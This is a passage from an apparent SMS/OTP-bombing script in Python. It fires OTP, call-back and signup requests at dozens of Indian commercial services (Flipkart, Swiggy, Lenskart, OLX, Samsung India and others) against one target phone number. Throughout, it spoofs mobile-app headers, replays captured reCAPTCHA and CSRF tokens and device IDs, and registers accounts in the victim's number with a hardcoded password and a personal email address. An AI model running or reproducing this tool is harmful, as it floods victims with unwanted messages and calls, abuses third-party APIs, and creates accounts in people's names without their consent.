        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'otpOnCall': True,
        'mobile': number,
        'otpType': 8.0,
        'transactionId': 1.708139023656E12,
    }

    response = requests.post('https://www.rummycircle.com/api/fl/account/v1/sendOtp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"otpOnCall":true,"mobile":"6789067890","otpType":8.0,"transactionId":1.708139023656E12}'
    #response = requests.post('https://www.rummycircle.com/api/fl/account/v1/sendOtp', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'actionRequestContext': {
            'type': 'LOGIN_IDENTITY_VERIFY',
            'loginIdPrefix': '+91',
            'loginId': number,
            'clientQueryParamMap': {
                'ret': '/',
                'entryPage': 'HEADER_ACCOUNT',
            },
            'loginType': 'MOBILE',
            'verificationType': 'OTP',
            'screenName': 'LOGIN_V4_MOBILE',
            'sourceContext': 'DEFAULT',
        },
    }

    response = requests.post('https://2.rome.api.flipkart.com/1/action/view', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"6789067890","clientQueryParamMap":{"ret":"/","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'
    #response = requests.post('https://2.rome.api.flipkart.com/1/action/view', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'retries': 0.0,
        'phone_number': '91'+number,
        'source': 'employer',
        'hash_type': 'employer',
    }

    response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"retries":0.0,"phone_number":"916789067890","source":"employer","hash_type":"employer"}'
    #response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'reason': 'loginOrRegister',
        'mobile': number,
    }

    response = requests.put('https://api.kreditbee.in/v1/me/otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"reason":"loginOrRegister","mobile":"6789067890"}'
    #response = requests.put('https://api.kreditbee.in/v1/me/otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'isPlaycircle': False,
        'mobile': number,
        'deviceId': 'accae6f6-29e3-4d99-94f0-7ea58c79ee83',
        'deviceName': '',
        'refCode': '',
    }

    response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"isPlaycircle":false,"mobile":"6789067890","deviceId":"accae6f6-29e3-4d99-94f0-7ea58c79ee83","deviceName":"","refCode":""}'
    #response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'variables': {
            'mobile': number,
        },
        'query': 'mutation sendOtp($mobile: String!) {\n  sendOtp(mobile: $mobile) {\n    mobile\n    message\n    __typename\n  }\n}\n',
        'operationName': 'sendOtp',
    }

    response = requests.post('https://shop.havells.com/graphql', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"variables":{"mobile":"6789067890"},"query":"mutation sendOtp($mobile: String!) {\\n  sendOtp(mobile: $mobile) {\\n    mobile\\n    message\\n    __typename\\n  }\\n}\\n","operationName":"sendOtp"}'
    #response = requests.post('https://shop.havells.com/graphql', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'device_id': '',
        'whatsaap_consent': False,
        'mobile_no': number,
        'condition_accepted': True,
    }

    response = requests.post('https://micro.banksathi.com/api/v1/auth_user/initinate_otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"device_id":"","whatsaap_consent":false,"mobile_no":"6789067890","condition_accepted":true}'
    #response = requests.post('https://micro.banksathi.com/api/v1/auth_user/initinate_otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'signInMobile': '+91'+number,
    }

    response = requests.post('https://www.homecentre.in/in/en/mobilelogin/sendOTP', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"signInMobile":"+916789067890"}'
    #response = requests.post('https://www.homecentre.in/in/en/mobilelogin/sendOTP', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'signInMobile': '+91'+number,
    }

    response = requests.post('https://www.lifestylestores.com/in/en/mobilelogin/sendOTP', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"signInMobile":"+916789067890"}'
    #response = requests.post('https://www.lifestylestores.com/in/en/mobilelogin/sendOTP', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_no': number,
        'recaptcha': '03AFcWeA4Lr7d1T0jrq0E6D6Mg6U2_AyT27GkvrQwdr87mECs9Ru4_vdUp43o0fKN13GUAL7IdGzB2276-zuT44NwbDjs5jlPCkYBIEUlZQXeb8JGAARw09feestYAyFZiPz5JknmoxElZQMNXaCh4LHzZAGitnPglzr65TsPVQcNsQR6CZQc_frKH3l3G0T3uO3tymdCTGUREOt3c8UE0a1Pybyr-m9yAETEuGnbSwMZGNOUY6ghR-XfcYV_dJBsTgXAUbrTvfyh9vtTSC62OaLbal_YS8dnNrS-hLisQKk6sV8VowIgi1xnfYLX3QmRLIrRpQdh2Zhv-vvxw3beo2NYRi-fzAfCtrWznbPWCDmbBd8MeJ9kqbUSEZRASSHW5h9owA7L4PYPch3f6cGrR72A1is9tAGCCaHQeihbw28Ad8dQG0NznhO_IEp1MV66UiPRLQ4qplNcO0qfGhN8kfdPRqP1d39012469Jbl2QN8LaiRc7ZZXj8iZ2pIblRVCRnNb-BRb2pJgLkCnFGuEw9QXYc9x8cJyJdgMKPInOu5rqI4zMqo_L6VvAHe-IQxWcRyUR1u9yJKxatYxbsjp1powZHjUu86Qg9MZUOpGTlQ0-clNr3KpAT0zh_D4ABzyRmqc-XaIdugMlvqMK2RPXifHoOgFqc_6se7nU_E44rC-TInKnT-pOPHoD77bn79FFs_612GVHgmG41lVxbgeEYzvptRiQ2L4XZSROkJYqMJKRf8Je2-3RY19ravf_dIbvt5o5yElm8CLf2MVdKlsERN88W55d1QXxMr7K0zy5XXz8X6IYoCQyfFAFxV8gQECfkU_A5D9VTQ7r1Ya5p9jtfb0o1Jw38mX4Rw_P_FXlp65loKO4wQQ1uliqLkV6GJAu0H1khCbti2st7UGrama3ff6i6hZC7J_IGklNqEHaRrlZ3kWfrEmYNmoECVNjQNnu8R8B7ziCBhkLTSrHlo_bpMEW00j8FDODiIebtIhT4-mD2A0_lFosbdW-OxmCm_m8xfUd7IuntrGVUVm9lqI7Suw0qjDEMzjYYH--pAxipgLBpcILRJaCJpBVANn9od7vjPPwY82ulBv6b69QbqB8tIGLUDZsyruokg3B-mTyVV_2elwhWw1MYA4-ETQj8uKmKS21SZ1oQJUzLRvH-OHSNxKKXplCJUJ-KZ39iTcJSikZnLJOLlXSy6fmcgQVb8c8VP1AVO0IpS1gbvu3lNYFw6QeNyWBbWG7Bur6EHZOPeQdgXNBx8b0CZYR0rI7Xrz2ys9BmuBwCX4-IXNgv_cVt-5qnMgYYckKQy4QKC0VKUjgcm5vgV6tGol06-wz-PRklqf3iQ4ZLftBRerdeD_aQqXPXN-MTQnc3o1CubJ6z2icEVRAvzGqvk3YUKv0NnZ68ifoj7vvAdKCaGLnq8ykp7UKuUHTNRdmVWuj3tGuadyCoEUVAhZKx2CpOTvTvadKYP-AJvyNM7ik_EEfOGXcMHlGJPXeNgOW4LWZBrvMsHzp69nqHyrD9XIEhB4onQMGTVhNfyNhlgPEBcjZrbKM0hJPTr4QdobqKtPVliFIXAaM3Spb2UMp6BT7AzyeP7fiFRYP9UlMHFw3sRgLM-cRNAs8U8lYdNxPv544K63xHlzyjJcL_pFIXbjplrpd_d5XWtJj2a6f0xGP1WKk2S7sZwt1zQu5kwfSqRBBEwqtj5zsbV3I5oN9fDdzpnjchUZ4fC2Ix-4b2MbmVQ6IpbOsqD9Bekgeu_twQewD76mx2sNghlm_vLkEGpim5ji03r7p2B1KaPoENbanv57AuvPv-3ca-LwPMTBa8bRSDq8RPH1H0Rwzlv-dfYhFjSR0ioFSPkisqkD7ZjaSU0EAauIbgLqG6D1whKgEA',
    }

    response = requests.post('https://www.titaneyeplus.com/api/auth/send-otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile_no":"6789067890","recaptcha":"03AFcWeA4Lr7d1T0jrq0E6D6Mg6U2_AyT27GkvrQwdr87mECs9Ru4_vdUp43o0fKN13GUAL7IdGzB2276-zuT44NwbDjs5jlPCkYBIEUlZQXeb8JGAARw09feestYAyFZiPz5JknmoxElZQMNXaCh4LHzZAGitnPglzr65TsPVQcNsQR6CZQc_frKH3l3G0T3uO3tymdCTGUREOt3c8UE0a1Pybyr-m9yAETEuGnbSwMZGNOUY6ghR-XfcYV_dJBsTgXAUbrTvfyh9vtTSC62OaLbal_YS8dnNrS-hLisQKk6sV8VowIgi1xnfYLX3QmRLIrRpQdh2Zhv-vvxw3beo2NYRi-fzAfCtrWznbPWCDmbBd8MeJ9kqbUSEZRASSHW5h9owA7L4PYPch3f6cGrR72A1is9tAGCCaHQeihbw28Ad8dQG0NznhO_IEp1MV66UiPRLQ4qplNcO0qfGhN8kfdPRqP1d39012469Jbl2QN8LaiRc7ZZXj8iZ2pIblRVCRnNb-BRb2pJgLkCnFGuEw9QXYc9x8cJyJdgMKPInOu5rqI4zMqo_L6VvAHe-IQxWcRyUR1u9yJKxatYxbsjp1powZHjUu86Qg9MZUOpGTlQ0-clNr3KpAT0zh_D4ABzyRmqc-XaIdugMlvqMK2RPXifHoOgFqc_6se7nU_E44rC-TInKnT-pOPHoD77bn79FFs_612GVHgmG41lVxbgeEYzvptRiQ2L4XZSROkJYqMJKRf8Je2-3RY19ravf_dIbvt5o5yElm8CLf2MVdKlsERN88W55d1QXxMr7K0zy5XXz8X6IYoCQyfFAFxV8gQECfkU_A5D9VTQ7r1Ya5p9jtfb0o1Jw38mX4Rw_P_FXlp65loKO4wQQ1uliqLkV6GJAu0H1khCbti2st7UGrama3ff6i6hZC7J_IGklNqEHaRrlZ3kWfrEmYNmoECVNjQNnu8R8B7ziCBhkLTSrHlo_bpMEW00j8FDODiIebtIhT4-mD2A0_lFosbdW-OxmCm_m8xfUd7IuntrGVUVm9lqI7Suw0qjDEMzjYYH--pAxipgLBpcILRJaCJpBVANn9od7vjPPwY82ulBv6b69QbqB8tIGLUDZsyruokg3B-mTyVV_2elwhWw1MYA4-ETQj8uKmKS21SZ1oQJUzLRvH-OHSNxKKXplCJUJ-KZ39iTcJSikZnLJOLlXSy6fmcgQVb8c8VP1AVO0IpS1gbvu3lNYFw6QeNyWBbWG7Bur6EHZOPeQdgXNBx8b0CZYR0rI7Xrz2ys9BmuBwCX4-IXNgv_cVt-5qnMgYYckKQy4QKC0VKUjgcm5vgV6tGol06-wz-PRklqf3iQ4ZLftBRerdeD_aQqXPXN-MTQnc3o1CubJ6z2icEVRAvzGqvk3YUKv0NnZ68ifoj7vvAdKCaGLnq8ykp7UKuUHTNRdmVWuj3tGuadyCoEUVAhZKx2CpOTvTvadKYP-AJvyNM7ik_EEfOGXcMHlGJPXeNgOW4LWZBrvMsHzp69nqHyrD9XIEhB4onQMGTVhNfyNhlgPEBcjZrbKM0hJPTr4QdobqKtPVliFIXAaM3Spb2UMp6BT7AzyeP7fiFRYP9UlMHFw3sRgLM-cRNAs8U8lYdNxPv544K63xHlzyjJcL_pFIXbjplrpd_d5XWtJj2a6f0xGP1WKk2S7sZwt1zQu5kwfSqRBBEwqtj5zsbV3I5oN9fDdzpnjchUZ4fC2Ix-4b2MbmVQ6IpbOsqD9Bekgeu_twQewD76mx2sNghlm_vLkEGpim5ji03r7p2B1KaPoENbanv57AuvPv-3ca-LwPMTBa8bRSDq8RPH1H0Rwzlv-dfYhFjSR0ioFSPkisqkD7ZjaSU0EAauIbgLqG6D1whKgEA"}'
    #response = requests.post('https://www.titaneyeplus.com/api/auth/send-otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'device_name': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'mobile': number,
    }

    response = requests.post('https://web-api.mpokket.in/registration/sendOtp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"device_name":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","mobile":"6789067890"}'
    #response = requests.post('https://web-api.mpokket.in/registration/sendOtp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'smsType': '1',
    }

    json_data = {
        'organizationId': '5eb393ee95fab7468a79d189',
        'mobile': number,
    }

    response = requests.post('https://api.penpencil.co/v1/users/resend-otp', params=params, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"6789067890"}'
    #response = requests.post('https://api.penpencil.co/v1/users/resend-otp', params=params, headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'firstName': 'Hii',
        'lastName': '',
        'countryCode': '+91',
        'mobile': number,
    }

    response = requests.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"firstName":"Hii","lastName":"","countryCode":"+91","mobile":"6789067890"}'
    #response = requests.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'idealLoginFlow': False,
        'phonenumber': number,
        'source': 'medibuddyInWeb',
        'platform': 'medibuddy',
        'flow': 'Retail-Login-Home-Flow',
        'advertiserId': '000a790f-d584-Lad4-9d71-6b2e99e854e3',
    }

    response = requests.post('https://loginprod.medibuddy.in/unified-login/user/register', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"idealLoginFlow":false,"phonenumber":"6789067890","source":"medibuddyInWeb","platform":"medibuddy","flow":"Retail-Login-Home-Flow","advertiserId":"000a790f-d584-Lad4-9d71-6b2e99e854e3"}'
    #response = requests.post('https://loginprod.medibuddy.in/unified-login/user/register', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneCode': '+91',
        'telephone': number,
    }

    response = requests.post('https://api-gateway.juno.lenskart.com/v3/customers/sendOtp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phoneCode":"+91","telephone":"6789067890"}'
    #response = requests.post('https://api-gateway.juno.lenskart.com/v3/customers/sendOtp', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'cstmMob': number,
    }

    response = requests.post(
        'https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb',
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"cstmMob":"6789067890"}'
    #response = requests.post(
    #    'https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb',
    #    headers=headers,
    #    data=data,
    #)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'whatsapp_opt_in': 1.0,
        'mobile': number,
    }

    response = requests.post('https://api.wakefit.co/api/consumer-sms-otp/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"whatsapp_opt_in":1.0,"mobile":"6789067890"}'
    #response = requests.post('https://api.wakefit.co/api/consumer-sms-otp/', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'deviceType': 'Website',
        'mobileNo': number,
        'deviceId': '110.226.233.51',
    }

    response = requests.post('https://customer.megacabs.com/api/otpforLogin', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"deviceType":"Website","mobileNo":"6789067890","deviceId":"110.226.233.51"}'
    #response = requests.post('https://customer.megacabs.com/api/otpforLogin', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'otpVia': 'mobile',
        'sg': 'dcb68d757272d371f609fe1bf866d8122b1cc1ed4c82eb2ca559f961ade224f7',
        'countryCode': '+91',
        'mobileNo': number,
        'type': 'signup',
    }

    response = requests.post('https://apiprod.thebodyshop.in/user-service/api/v1/users/resend-otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"otpVia":"mobile","sg":"dcb68d757272d371f609fe1bf866d8122b1cc1ed4c82eb2ca559f961ade224f7","countryCode":"+91","mobileNo":"6789067890","type":"signup"}'
    #response = requests.post('https://apiprod.thebodyshop.in/user-service/api/v1/users/resend-otp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'is_web': '3',
        'phone_number': number,
    }

    response = requests.post('https://api.doubtnut.com/v4/student/login', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"is_web":"3","phone_number":"6789067890"}'
    #response = requests.post('https://api.doubtnut.com/v4/student/login', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobileNumber': number,
    }

    response = requests.post('https://api.payrup.com/api/auth/otp/generate', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobileNumber":"6789067890"}'
    #response = requests.post('https://api.payrup.com/api/auth/otp/generate', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'loginId': number,
        'appHashKey': '@www.goibibo.com #',
        'countryCode': '91',
        'channel': [
            'MOBILE',
        ],
    }

    response = requests.post('https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"loginId":"6789067890","appHashKey":"@www.goibibo.com #","countryCode":"91","channel":["MOBILE"]}'
    #response = requests.post('https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'password': 'Hii@123',
        'referral_code': '',
        'name': 'Hii',
        'mobile': number,
        '_csrf': 'OSqGN6nM9kk2-xlDvRpZh7YSp_Z_pa3pmSgIpLJM',
        'email': 'mkvcinemas812@gmail.com',
    }

    response = requests.post('https://www.swiggy.com/mapi/auth/signup', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"password":"Hii@123","referral_code":"","name":"Hii","mobile":"6789067890","_csrf":"OSqGN6nM9kk2-xlDvRpZh7YSp_Z_pa3pmSgIpLJM","email":"mkvcinemas812@gmail.com"}'
    #response = requests.post('https://www.swiggy.com/mapi/auth/signup', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://api.bookscape.com/ecom/api/auth/send-user-mobile-otp/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile":"6789067890"}'
    #response = requests.post('https://api.bookscape.com/ecom/api/auth/send-user-mobile-otp/', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': number,
        'templateName': 'default',
        'channel': 'sms',
        'flow': 'SIGNIN',
    }

    response = requests.post('https://www.dream11.com/auth/passwordless/init', headers=headers, json=json_data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'hashKey': '',
        'phoneNumber': '+91'+number,
    }

    response = requests.post('https://stage-api-gateway.getzype.com/auth/signinup/code', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"hashKey":"","phoneNumber":"+916789067890"}'
    #response = requests.post('https://stage-api-gateway.getzype.com/auth/signinup/code', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone_number': '+91'+number,
    }

    response = requests.post('https://kukufm.com/api/v1/users/auth/send-otp/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone_number":"+916789067890"}'
    #response = requests.post('https://kukufm.com/api/v1/users/auth/send-otp/', headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'lang': 'en',
        'cache-version': '2023-11-13',
    }

    json_data = {
        'phone': '+91'+number,
        'site_id': '674306500608958319',
        'require_buyer_account': False,
    }

    response = requests.post(
        'https://www.shopmadeindc.com/app/accounts/v1/verification',
        params=params,
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"+916789067890","site_id":"674306500608958319","require_buyer_account":false}'
    #response = requests.post('https://www.shopmadeindc.com/app/accounts/v1/verification', params=params, headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'MobileNumber': '91'+number,
        'MessageParams': {
            'MerchantKey': 'null',
        },
    }

    response = requests.post('https://authentication.zestmoney.in/v2/mobile/otp/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"MobileNumber":"916789067890","MessageParams":{"MerchantKey":"null"}}'
    #response = requests.post('https://authentication.zestmoney.in/v2/mobile/otp/', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'lang': 'en-IN',
    }

    json_data = {
        'method': 'call',
        'phone': '+91'+number,
        'language': 'en-IN',
        'grantType': 'retry',
    }

    response = requests.post('https://www.olx.in/api/auth/authenticate', params=params, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"method":"call","phone":"+916789067890","language":"en-IN","grantType":"retry"}'
    #response = requests.post('https://www.olx.in/api/auth/authenticate', params=params, headers=headers, data=data)


    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'firstName': 'Hii',
        'password': '',
        'rilFnlRegisterReferralCode': '',
        'requestType': 'SENDOTP',
        'mobileNumber': number,
        'login': 'mkvcinemas812@gmail.com',
        'newDesign': False,
        'genderType': 'M',
    }

    response = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"firstName":"Hii","password":"","rilFnlRegisterReferralCode":"","requestType":"SENDOTP","mobileNumber":"6789067890","login":"mkvcinemas812@gmail.com","newDesign":false,"genderType":"M"}'
    #response = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobileNumber': number,
    }

    response = requests.post('https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobileNumber":"6789067890"}'
    #response = requests.post('https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': number,
        'appPackageName': 'in.ludo.supremegold',
    }

    response = requests.post('https://app.ludosupreme.com/v1.0/user/requestSignupOtp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phoneNumber":"6789067890","appPackageName":"in.ludo.supremegold"}'
    #response = requests.post('https://app.ludosupreme.com/v1.0/user/requestSignupOtp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'vid': '6411832024542314',
        'service_type': 0.0,
        'username_type': 'mobile',
        'username': number,
    }

    response = requests.post('https://www.beyoung.in/api/sendOtp.json', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"vid":"6411832024542314","service_type":0.0,"username_type":"mobile","username":"6789067890"}'
    #response = requests.post('https://www.beyoung.in/api/sendOtp.json', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'customer_mobile': number,
    }

    response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"customer_mobile":"6789067890"}'
    #response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'lang': 'en-IN',
    }

    json_data = {
        'phone': '+91'+number,
        'language': 'en-IN',
        'grantType': 'phone',
    }

    response = requests.post('https://www.olx.in/api/auth/authenticate', params=params, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"+916789067890","language":"en-IN","grantType":"phone"}'
    #response = requests.post('https://www.olx.in/api/auth/authenticate', params=params, headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'query': '\nmutation {\n    createAccountOTP(\n        mobilenumber:"91'+number+'",\n        websiteId:1\n    )\n        {\n            status\n            message\n        }\n}',
    }

    response = requests.post('https://admin.vedistry.com/graphql', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"query":"\\nmutation {\\n    createAccountOTP(\\n        mobilenumber:\\"916789067890\\",\\n        websiteId:1\\n    )\\n        {\\n            status\\n            message\\n        }\\n}"}'
    #response = requests.post('https://admin.vedistry.com/graphql', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'user_id': number,
    }

    response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"user_id":"6789067890"}'
    #response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': '+91'+number,
    }

    response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"+916789067890"}'
    #response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'firstName': '',
        'lastName': '',
        'password': '',
        'isoCode': 'IN',
        'payload': '',
        'signature': '',
        'cleverTapId': 'be247a4b7122489a8b96801cb34b2be1',
        'userSource': 'MWEB',
        'countryCode': '91',
        'mobile': number,
        'userType': 'ONLINE',
    }

